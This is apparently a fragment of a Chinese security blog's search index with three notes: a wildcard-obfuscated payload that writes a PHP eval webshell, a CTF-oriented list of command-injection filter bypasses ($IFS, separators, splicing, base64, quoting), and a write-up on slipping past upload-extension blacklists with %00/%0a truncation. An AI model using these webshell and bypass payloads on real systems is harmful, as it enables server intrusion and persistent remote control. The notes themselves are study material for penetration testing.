    <title><![CDATA[Linux通配符绕过文件名黑名单]]></title>
    <url>%2Farchives%2F18ca0ec6.html</url>
    <content type="text"><![CDATA[文章来源: http://www.sohu.com/a/235200861_658302 通配符绕过黑名单,做免杀还是蛮有意思的,先做记录 1.原本的payload cmd=/bin/echo &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php 2.变形后的payload： cmd=/???/e??? &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Linux特性</category>
      </categories>
      <tags>
        <tag>Linux特性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于命令执行以及常见的一些绕过过滤的方法_浅谈CTF中命令执行与绕过的小技巧]]></title>
    <url>%2Farchives%2Fc6ef1d37.html</url>
    <content type="text"><![CDATA[https://blog.csdn.net/silence1_/article/details/96135760 http://pupiles.com/shellcode.html命令执行的一些绕过技巧 ① 空格过滤空格可以用以下字符串代替：&lt; 、%09、$IFS$9、 ${IFS}等 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 ② 一些命令分隔符%0a 符号、%0d 符号、; 符号、&amp; 符号、| 符号1、在 shell 中，担任”连续指令”功能的符号就是”;”2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示 ③ 黑名单绕过1、拼接绕过比如：a=l;b=s;$a$b 上面的第二道题目也是利用偶读拼接方法绕过黑名单：a=fl;b=ag;cat $a$b2、base64解码绕过比如：echo MTIzCg==|base64 -d 其将会打印1233、单引号和双引号绕过比如：ca&apos;&apos;t flag 或ca&quot;&quot;t flag4、反斜杠绕过比如：ca\t fl\ag④长度限制长度限制可以用文件构造的方式来绕过。linux下可以用 1&gt;a创建文件名为a的空文件ls -t&gt;test则会将目录按时间排序后写进test文件中sh命令可以从一个文件中读取命令来执行 利用这些特性，即可以成功绕过长度限制来执行命令。\ M 亲测有效浅谈CTF中命令执行与绕过的小技巧]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Part1:黑名单上传之00截断失败的情况下绕过(Win+Php5.4.45)]]></title>
    <url>%2Farchives%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[一、前言大家好,我叫MaiKeFee,是一名信息安全爱好者,初次见面,先水一篇文章再说.前几天在深圳出差,遇到一个黑名单上传点(Linux+Php(版本未知)),除了Php|Aspx|Jsp|Php3等等类似脚本都试过不能上传,其余可上传;于是第一时间想到测试%00截断显然是不能上传,不然也不会有此下文. 随后随手测试了: %00截断不能上传(实战环境+Linux+nginx+php(未知版本)),但是%0a、%0d,没想到竟然能上传了!!但是很遗憾,它不解析;为了寻找原因开始搭建环境复现.. 二、环境搭建 哒哒哒,环境搭好了,接下来开始测试啦 测试环境:Win+phpstudy(PHP Version 5.4.45)+上传黑名单 1.测试%00截断(上传成功并解析) 2.接下来是测试%0a截断(上传成功并解析) 3.接下来是测试%0d截断(上传失败并报错) 三、Fuzzing根据这样的特性,写个脚本生成Payload(%00-%99)(a-z)进行fuzzing 拿起来fuzzing就是一把梭 经过梭哈后,发现这些空payload,基本都可以绕过黑名单(%00|%0a|%8b|%8c|%8d..) 当然,要是提到黑名单绕过的姿势还是挺多的: 1.根据win的特性,空格也是可以绕过的2.::$DATA数据流绕过,NTFS文件系统特性绕过 3.php3、php5..4.点号(.)绕过,Win特性… 就不一一举例,本人项目环境是(Linux+nginx),绕过黑名单,但是不解析,在Win下测试,绕过后可解析(暂没深入)..总结:遇到00截断不成功的情况下,测试了0a可以成功绕过(估计跟php版本有关,待考察) 但是值得一提的是此文和网上提到https://www.freebuf.com/articles/web/179401.html 这里均提到版本问题,但本人测试环境Php5.4.45,可00截断并解析,这里暂时无从考证了,知道的大佬指点一下迷津!]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>上传漏洞</category>
      </categories>
  </entry>
</search>
